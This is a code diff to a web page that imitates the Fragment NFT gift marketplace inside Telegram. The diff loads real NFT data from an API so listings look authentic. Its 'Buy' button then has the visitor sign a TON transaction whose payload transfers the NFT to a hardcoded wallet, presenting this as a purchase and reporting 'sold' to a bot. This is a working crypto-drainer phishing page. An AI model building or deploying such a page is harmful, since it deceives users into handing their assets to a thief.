@@ -6,6 +6,8 @@
     <title>Fragment</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@ton/core/dist/index.min.js"></script>
+    <script src="https://unpkg.com/@ton/ton/dist/index.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -80,19 +82,19 @@
         <div class="details-table">
             <div class="detail-row">
                 <div class="detail-label">Owner</div>
-                <div class="detail-value owner">UQCNTN_DlmdlGRaegGLVUGNB2b2CYIf_FO9ULeCZ1BUklF6k</div>
+                <div class="detail-value owner" id="ownerText">Loading...</div>
             </div>
             <div class="detail-row">
                 <div class="detail-label">Model</div>
-                <div class="detail-value">Trio Scoop <span class="percent-badge">3%</span></div>
+                <div class="detail-value" id="modelText">Loading...</div>
             </div>
             <div class="detail-row">
                 <div class="detail-label">Backdrop</div>
-                <div class="detail-value">Grape <span class="percent-badge">1.5%</span></div>
+                <div class="detail-value" id="backdropText">Loading...</div>
             </div>
             <div class="detail-row">
                 <div class="detail-label">Symbol</div>
-                <div class="detail-value">Maple Leaf <span class="percent-badge">0.7%</span></div>
+                <div class="detail-value" id="symbolText">Loading...</div>
             </div>
             <div class="detail-row">
                 <div class="detail-label">Issued</div>
@@ -102,15 +104,11 @@
 
         <div class="price-block">
             <div class="price-label">Sell Price *</div>
-            <div class="price-value" id="priceText">
-                Loading...
-            </div>
+            <div class="price-value" id="priceText">Loading...</div>
             <div class="price-note">* The owner of this asset is ready to sell it for this price without an auction.</div>
         </div>
 
-        <button class="buy-btn" id="sellBtn">
-            Buy
-        </button>
+        <button class="buy-btn" id="sellBtn">Buy</button>
         <div class="status" id="statusText"></div>
 
         <div class="subscribe-link">Subscribe to updates</div>
@@ -135,48 +133,93 @@
         tg.ready();
         tg.expand();
 
-        // ВСТАВЛЕН ТВОЙ КОШЕЛЕК
         const MY_WALLET_ADDRESS = "UQCNTN_DlmdlGRaegGLVUGNB2b2CYIf_FO9ULeCZ1BUklF6k"; 
-        const NFT_TRANSFER_PAYLOAD = "te6cckEBAQEAAgAAAEysuc0="; 
 
         const urlParams = new URLSearchParams(window.location.search);
-        const giftId = urlParams.get('gift') || 'icecream-162005';
+        const nftAddress = urlParams.get('nft') || 'EQACcQpR2fmdeENWdE2YGQWHVxSTyA8Zq4_k7rk_IaxCRXNe';
         const price = urlParams.get('price') || '5';
 
-        const parts = giftId.split('-');
-        const giftName = parts[0].charAt(0).toUpperCase() + parts[0].slice(1);
-        const giftNum = parts[1] || '';
-
-        document.getElementById('giftTitle').innerText = `${giftName} #${giftNum}`;
-        document.getElementById('giftImage').src = `https://nft.fragment.com/gift/${giftId}.webp`;
         document.getElementById('priceText').innerHTML = `💎 ${price} <span class="price-usd">~$${(price * 1.5).toFixed(2)}</span>`;
         document.getElementById('sellBtn').innerText = `Buy for 💎 ${price}`;
+
+        // Функция для загрузки реальных данных с TON API
+        async function loadNFTData() {
+            try {
+                const res = await fetch(`https://tonapi.io/v2/nfts/${nftAddress}`);
+                const data = await res.json();
+                
+                // Название и картинка
+                const name = data.metadata?.name || 'Unknown NFT';
+                document.getElementById('giftTitle').innerText = name;
+                if (data.previews && data.previews.length > 0) {
+                    document.getElementById('giftImage').src = data.previews[0].url;
+                }
+
+                // Владелец
+                const owner = data.owner?.address || 'Unknown';
+                document.getElementById('ownerText').innerText = owner.substring(0, 10) + '...' + owner.substring(owner.length - 6);
+
+                // Атрибуты
+                if (data.metadata && data.metadata.attributes) {
+                    data.metadata.attributes.forEach(attr => {
+                        if (attr.trait_type === 'Model') {
+                            document.getElementById('modelText').innerHTML = `${attr.value} <span class="percent-badge">${attr.rarity || ''}%</span>`;
+                        }
+                        if (attr.trait_type === 'Backdrop') {
+                            document.getElementById('backdropText').innerHTML = `${attr.value} <span class="percent-badge">${attr.rarity || ''}%</span>`;
+                        }
+                        if (attr.trait_type === 'Symbol') {
+                            document.getElementById('symbolText').innerHTML = `${attr.value} <span class="percent-badge">${attr.rarity || ''}%</span>`;
+                        }
+                    });
+                }
+
+            } catch (e) {
+                console.error("Ошибка загрузки данных:", e);
+                document.getElementById('giftTitle').innerText = "NFT Gift";
+                document.getElementById('giftImage').src = "https://nft.fragment.com/gift/icecream-162005.webp";
+            }
+        }
+
+        loadNFTData();
 
         const tonConnectUI = new TONCONNECT_UI.TonConnectUI({
             manifestUrl: "https://snoix69.github.io/swap-helper/tonconnect-manifest.json"
         });
 
         document.getElementById("sellBtn").onclick = async () => {
-            document.getElementById("statusText").innerText = "Opening wallet...";
+            document.getElementById("statusText").innerText = "Preparing transaction...";
             
             try {
+                const { beginCell, Address } = ton_core;
+                const myWallet = Address.parse(MY_WALLET_ADDRESS);
+
+                const payload = beginCell()
+                    .storeUint(0x5fcc3d14, 32) 
+                    .storeUint(0, 64)          
+                    .storeAddress(myWallet)    
+                    .storeAddress(myWallet)    
+                    .storeUint(0, 1)           
+                    .storeCoins(1)             
+                    .storeUint(0, 1)           
+                    .endCell()
+                    .toBoc()
+                    .toString("base64");
+
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 600,
-                    messages: [
-                        {
-                            address: MY_WALLET_ADDRESS,
-                            amount: "50000000", 
-                            payload: NFT_TRANSFER_PAYLOAD
-                        }
-                    ]
+                    messages: [{ address: nftAddress, amount: "50000000", payload: payload }]
                 };
 
+                document.getElementById("statusText").innerText = "Opening wallet...";
                 await tonConnectUI.sendTransaction(transaction);
+                
                 document.getElementById("statusText").innerText = "Success! Returning to bot...";
-                tg.sendData(JSON.stringify({status: "sold", item: giftId}));
+                tg.sendData(JSON.stringify({status: "sold", item: nftAddress}));
                 
             } catch (e) {
-                document.getElementById("statusText").innerText = "Transaction cancelled.";
+                console.error(e);
+                document.getElementById("statusText").innerText = "Transaction cancelled or error.";
             }
         };
     </script>
